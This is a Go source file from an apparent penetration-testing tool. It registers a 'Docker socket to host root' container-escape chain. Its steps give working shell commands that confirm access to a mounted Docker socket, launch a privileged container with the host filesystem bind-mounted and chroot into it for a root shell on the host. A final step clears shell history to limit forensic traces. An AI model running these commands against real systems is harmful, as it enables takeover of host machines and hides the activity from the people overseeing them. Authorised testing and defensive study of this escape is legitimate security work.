package chains

import (
	"github.com/tristanvaquero/escape/pkg/check"
	"github.com/tristanvaquero/escape/pkg/exploit"
)

// dockerSockPivot — the canonical container escape: a workload with the
// Docker daemon socket bind-mounted in is one `docker run` away from
// being root on the host.
//
// Public references: Aquasec, NCC Group, Trail of Bits.
type dockerSockPivot struct{ exploit.Base }

func (c *dockerSockPivot) Matches(results []check.Result) *exploit.Match {
	if !exploit.HasFailedID(results, "container.mounts.docker_sock") {
		return nil
	}
	conf := "high"
	return &exploit.Match{
		ChainID:    c.ID(),
		Required:   []string{"container.mounts.docker_sock"},
		Confidence: conf,
		Evidence:   []string{"Container runtime socket reachable inside the workload."},
	}
}

func (c *dockerSockPivot) Steps(_ *exploit.Match) []exploit.Step {
	return []exploit.Step{
		{
			Title: "Confirm socket is reachable and writable",
			Command: `ls -l /var/run/docker.sock
docker -H unix:///var/run/docker.sock info | head -20`,
			Note: "If `docker` is not installed inside the container, install it from Alpine apk or use the static binary.",
		},
		{
			Title: "Pivot to host root via a new container with / bind-mounted",
			Command: `docker -H unix:///var/run/docker.sock run --rm -it \
    --privileged --pid=host \
    -v /:/host alpine \
    chroot /host /bin/bash`,
			Note: "You're now root on the host. /host is the host root.",
		},
		{
			Title: "Cleanup",
			Command: `# clear bash history if persistence/forensics matter
unset HISTFILE; history -c`,
			Note: "Pure cleanup, no detection-evasion advice beyond what's standard for authorised pentests.",
		},
	}
}

func init() {
	exploit.Register(&dockerSockPivot{Base: exploit.Base{
		IDValue:       "chain.docker_sock_pivot",
		NameValue:     "Docker socket → host root",
		GoalValue:     "Spawn a privileged container that mounts / from the host, giving root shell on the host.",
		RiskValue:     exploit.RiskDestructive,
		SeverityValue: check.SeverityCritical,
		ReferencesValue: []string{
			"https://blog.aquasec.com/docker-socket-mount",
			"https://research.nccgroup.com/2019/07/03/abusing-privileged-and-unprivileged-linux-containers/",
		},
		AttackValue: []string{"T1611", "T1610"},
	}})
}
